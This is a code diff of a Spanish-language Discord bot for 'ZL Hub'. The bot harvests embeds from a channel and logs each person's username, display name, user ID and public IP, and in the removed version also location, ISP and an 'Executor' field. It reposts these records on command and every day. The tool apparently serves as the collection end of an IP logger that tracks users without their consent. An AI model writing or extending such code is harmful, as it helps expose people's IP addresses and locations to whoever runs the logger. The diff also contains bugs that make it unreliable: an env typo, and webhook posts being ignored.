@@ -1,153 +1,264 @@
-// ===============================
-// BOT LOGGER COMPLETO BY CHATGPT
-// ===============================
-const TOKEN = procss.env.TOKEN;
-const fs = require("fs");
-const path = require("path");
-const { Client, GatewayIntentBits } = require("discord.js");
+const { Client, GatewayIntentBits, EmbedBuilder, Collection } = require('discord.js');
+const fs = require('fs');
+const path = require('path');
+const TOKEN = process.env.TOKEN;
+// Configuración
+const SOURCE_CHANNEL_ID = '1437151487141740637';
+const LOGS_CHANNEL_ID = '1440773871254110300';
 
-// ===============================
-// CONFIG
-// ===============================
-const LOG_FOLDER = "./logs";
-const CHANNEL_ID = "1440773871254110300";
+// Almacenamiento de datos
+let extractedData = [];
+let dailyLogs = [];
 
-// Crear carpeta si no existe
-if (!fs.existsSync(LOG_FOLDER)) fs.mkdirSync(LOG_FOLDER);
+class ExtractedInfo {
+    constructor(nombre, display, user_id, ip, fecha) {
+        this.nombre = nombre;
+        this.display = display;
+        this.user_id = user_id;
+        this.ip = ip;
+        this.fecha = fecha;
+    }
+    
+    toString() {
+        return `${this.nombre} | ${this.display} | ${this.user_id} | ${this.ip} | ${this.fecha}`;
+    }
+}
 
-// ===============================
-// INICIAR BOT
-// ===============================
+// Crear el cliente con los intents necesarios
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent
+        GatewayIntentBits.MessageContent,
+        GatewayIntentBits.GuildMembers
     ]
 });
 
-// ===============================
-// GUARDAR LOG EN ARCHIVO
-// ===============================
-function saveLog(data) {
-    const fileName = path.join(LOG_FOLDER, `${Date.now()}.json`);
-    fs.writeFileSync(fileName, JSON.stringify(data, null, 2));
+// Comandos
+client.commands = new Collection();
+
+// Función para extraer valores entre backticks
+function extractValue(text) {
+    if (!text) return "N/A";
+    const matches = text.match(/```(.*?)```/);
+    return matches ? matches[1].trim() : "N/A";
 }
 
-// ===============================
-// LEER TODOS LOS LOGS
-// ===============================
-function getAllLogs() {
-    const files = fs.readdirSync(LOG_FOLDER);
-    let logs = [];
+// Función para procesar embeds
+function processEmbed(embed) {
+    try {
+        let nombre = "N/A";
+        let display = "N/A";
+        let user_id = "N/A";
+        let ip = "N/A";
+        let fecha = new Date().toLocaleString('es-ES');
 
-    for (const file of files) {
-        const raw = fs.readFileSync(path.join(LOG_FOLDER, file));
-        logs.push(JSON.parse(raw));
+        // Buscar en los campos del embed
+        if (embed.fields && embed.fields.length > 0) {
+            for (const field of embed.fields) {
+                const fieldName = field.name.toLowerCase();
+                const fieldValue = field.value || '';
+
+                if (fieldName.includes('usuario')) {
+                    // Extraer nombre, display e ID
+                    const lines = fieldValue.split('\n');
+                    for (const line of lines) {
+                        const lowerLine = line.toLowerCase();
+                        if (lowerLine.includes('nombre:')) {
+                            nombre = extractValue(line);
+                        } else if (lowerLine.includes('display:')) {
+                            display = extractValue(line);
+                        } else if (lowerLine.includes('id:')) {
+                            user_id = extractValue(line);
+                        }
+                    }
+                } else if (fieldName.includes('ip pública')) {
+                    ip = extractValue(fieldValue);
+                }
+            }
+        }
+
+        // Crear objeto con la información extraída
+        const info = new ExtractedInfo(nombre, display, user_id, ip, fecha);
+        extractedData.push(info);
+        dailyLogs.push(info);
+
+        console.log(`Datos extraídos: ${info.toString()}`);
+        return info;
+
+    } catch (error) {
+        console.error('Error procesando embed:', error);
+        return null;
     }
-
-    return logs;
 }
 
-// ===============================
-// CAPTURA DE MENSAJES (incluye WEBHOOKS)
-// ===============================
-client.on("messageCreate", message => {
-
-    // Ignorar bots, excepto webhooks
-    if (!message.webhookId && message.author.bot) return;
-
-    // Verificar que vengan datos del embed
-    const embed = message.embeds[0];
-    if (!embed) return;
-
-    // Extraer información del embed
-    let data = {
-        Nombre: "N/A",
-        Display: "N/A",
-        IP: "N/A",
-        Pais: "N/A",
-        Estado: "N/A",
-        Ciudad: "N/A",
-        ISP: "N/A",
-        Executor: "N/A",
-        Cuenta: "N/A"
-    };
-
-    // Buscar datos dentro de fields
-    for (const field of embed.fields) {
-
-        if (field.name.includes("USUARIO")) {
-            const texto = field.value;
-            data.Nombre = texto.match(/USUARIO:\s(\S+)/)?.[1] || "N/A";
-            data.Display = texto.match(/DISPLAY:\s(.+)/)?.[1] || "N/A";
-        }
-
-        if (field.name.includes("IP")) {
-            data.IP = field.value.replace(/`/g, "");
-        }
-
-        if (field.name.includes("UBICACIÓN")) {
-            data.Pais = field.value.match(/País:\s```(.+?)```/)?.[1] || "N/A";
-            data.Estado = field.value.match(/Estado:\s```(.+?)```/)?.[1] || "N/A";
-            data.Ciudad = field.value.match(/Ciudad:\s```(.+?)```/)?.[1] || "N/A";
-            data.ISP = field.value.match(/\*\*ISP:\*\*\s(.+)/)?.[1] || "N/A";
-        }
-
-        if (field.name.includes("SISTEMA")) {
-            data.Executor = field.value.match(/Executor:\s(.+)/)?.[1] || "N/A";
-            data.Cuenta = field.value.match(/Cuenta:\s(.+)/)?.[1] || "N/A";
-        }
-    }
-
-    // Guardar en archivo
-    saveLog(data);
+// Evento cuando el bot está listo
+client.once('ready', () => {
+    console.log(`Bot conectado como ${client.user.tag}`);
+    startDailyLogTask();
 });
 
-// ===============================
-// COMANDO !loggs → ENVÍA TODOS
-// ===============================
-client.on("messageCreate", async message => {
-    if (message.content === "!loggs") {
+// Evento para mensajes
+client.on('messageCreate', async (message) => {
+    // Ignorar mensajes del propio bot
+    if (message.author.bot) return;
 
-        const logs = getAllLogs();
+    // Procesar comando !loggs
+    if (message.content === '!loggs') {
+        await sendCurrentLogs(message.channel);
+    }
 
-        if (logs.length === 0) {
-            return message.reply("⚠️ No hay logs guardados todavía.");
-        }
+    // Procesar comando !stats
+    if (message.content === '!stats') {
+        await showStats(message.channel);
+    }
 
-        for (const log of logs) {
-            await message.channel.send(
-                `${log.Nombre} | ${log.Display} | ${log.IP} | ${log.Pais} | ${log.Estado} | ${log.Ciudad} | ${log.ISP} | ${log.Executor} | ${log.Cuenta}`
-            );
+    // Leer embeds del canal fuente
+    if (message.channel.id === SOURCE_CHANNEL_ID && message.embeds.length > 0) {
+        for (const embed of message.embeds) {
+            processEmbed(embed);
         }
     }
 });
 
-// ===============================
-// ENVÍO AUTOMÁTICO CADA DÍA
-// ===============================
-setInterval(async () => {
+// Función para enviar logs actuales
+async function sendCurrentLogs(channel) {
+    if (extractedData.length === 0) {
+        await channel.send('No hay logs disponibles.');
+        return;
+    }
 
-    const channel = client.channels.cache.get(CHANNEL_ID);
-    if (!channel) return;
+    // Crear embed con los logs
+    const embed = new EmbedBuilder()
+        .setTitle('📊 LOGS ACTUALES - ZL Hub')
+        .setColor(0x00FF00)
+        .setTimestamp();
 
-    const logs = getAllLogs();
-    if (logs.length === 0) return;
+    // Tomar los últimos 50 registros
+    const recentLogs = extractedData.slice(-50);
+    let logDescription = '';
 
-    for (const log of logs) {
-        await channel.send(
-            `${log.Nombre} | ${log.Display} | ${log.IP} | ${log.Pais} | ${log.Estado} | ${log.Ciudad} | ${log.ISP} | ${log.Executor} | ${log.Cuenta}`
+    recentLogs.forEach((log, index) => {
+        logDescription += `**${index + 1}.** ${log.toString()}\n`;
+    });
+
+    embed.setDescription(logDescription.length > 4096 ? 
+        logDescription.substring(0, 4093) + '...' : 
+        logDescription
+    );
+
+    embed.setFooter({ 
+        text: `Total de registros: ${extractedData.length} • ZL Hub`
+    });
+
+    await channel.send({ embeds: [embed] });
+}
+
+// Función para mostrar estadísticas
+async function showStats(channel) {
+    const totalLogs = extractedData.length;
+    const today = new Date().toLocaleDateString('es-ES');
+    const todayLogs = extractedData.filter(log => 
+        log.fecha.includes(today)
+    ).length;
+
+    const embed = new EmbedBuilder()
+        .setTitle('📈 ESTADÍSTICAS - ZL Hub')
+        .setColor(0x0099FF)
+        .addFields(
+            { name: 'Total de Logs', value: totalLogs.toString(), inline: true },
+            { name: 'Logs Hoy', value: todayLogs.toString(), inline: true },
+            { name: 'Canal Fuente', value: `<#${SOURCE_CHANNEL_ID}>`, inline: true }
+        )
+        .setTimestamp();
+
+    await channel.send({ embeds: [embed] });
+}
+
+// Tarea diaria para enviar logs
+function startDailyLogTask() {
+    // Calcular tiempo hasta la próxima medianoche
+    const now = new Date();
+    const midnight = new Date();
+    midnight.setHours(24, 0, 0, 0);
+    
+    const timeUntilMidnight = midnight.getTime() - now.getTime();
+
+    // Programar primera ejecución a medianoche
+    setTimeout(() => {
+        sendDailyLogs();
+        // Programar ejecución cada 24 horas
+        setInterval(sendDailyLogs, 24 * 60 * 60 * 1000);
+    }, timeUntilMidnight);
+
+    console.log('Tarea diaria programada. Próxima ejecución a las 00:00');
+}
+
+// Función para enviar logs diarios
+async function sendDailyLogs() {
+    try {
+        const logsChannel = await client.channels.fetch(LOGS_CHANNEL_ID);
+        if (!logsChannel) {
+            console.error('No se pudo encontrar el canal de logs');
+            return;
+        }
+
+        if (dailyLogs.length === 0) {
+            const embed = new EmbedBuilder()
+                .setTitle('📊 LOGS DIARIOS - ZL Hub')
+                .setDescription('No hay registros para el día de hoy.')
+                .setColor(0xFFA500)
+                .setTimestamp();
+
+            await logsChannel.send({ embeds: [embed] });
+            return;
+        }
+
+        // Crear embed para logs diarios
+        const embed = new EmbedBuilder()
+            .setTitle('📊 LOGS DIARIOS - ZL Hub')
+            .setColor(0x00FF00)
+            .setTimestamp();
+
+        let logDescription = '';
+        dailyLogs.forEach((log, index) => {
+            logDescription += `**${index + 1}.** ${log.toString()}\n`;
+        });
+
+        embed.setDescription(logDescription.length > 4096 ? 
+            logDescription.substring(0, 4093) + '...' : 
+            logDescription
         );
+
+        embed.addFields({
+            name: `Resumen del día`,
+            value: `**Total de registros:** ${dailyLogs.length}\n**Fecha:** ${new Date().toLocaleDateString('es-ES')}`
+        });
+
+        embed.setFooter({ 
+            text: 'ZL Hub • Logs Automáticos Diarios' 
+        });
+
+        await logsChannel.send({ embeds: [embed] });
+
+        // Limpiar logs del día después de enviarlos
+        dailyLogs = [];
+
+        console.log(`Logs diarios enviados. Total: ${dailyLogs.length} registros`);
+
+    } catch (error) {
+        console.error('Error enviando logs diarios:', error);
     }
+}
 
-    // limpiar logs después de enviarlos
-    fs.rmSync(LOG_FOLDER, { recursive: true, force: true });
-    fs.mkdirSync(LOG_FOLDER);
+// Manejo de errores
+client.on('error', (error) => {
+    console.error('Error del cliente:', error);
+});
 
-}, 24 * 60 * 60 * 1000); // 1 día
+process.on('unhandledRejection', (error) => {
+    console.error('Unhandled Promise Rejection:', error);
+});
 
-// ===============================
-// LOGIN
-// ===============================
+// Iniciar el bot
 client.login(TOKEN);
